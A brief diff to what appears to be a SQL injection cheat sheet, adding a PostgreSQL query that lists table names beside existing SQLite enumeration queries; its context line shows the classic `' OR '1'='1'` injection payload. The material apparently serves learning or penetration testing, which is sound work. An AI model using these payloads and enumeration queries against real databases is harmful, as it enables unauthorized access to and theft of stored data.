@@ -31,3 +31,4 @@ SELECT * FROM users WHERE name = '' OR '1'='1';
 | ----------- | -- | ----- |
 | Print all table names | sqlite | `SELECT name FROM sqlite_master` |
 | Print table schema | sqlite | `SELECT sql FROM sqlite_master WHERE name='users'` |
+| Print all table names | postgres | `SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'` |
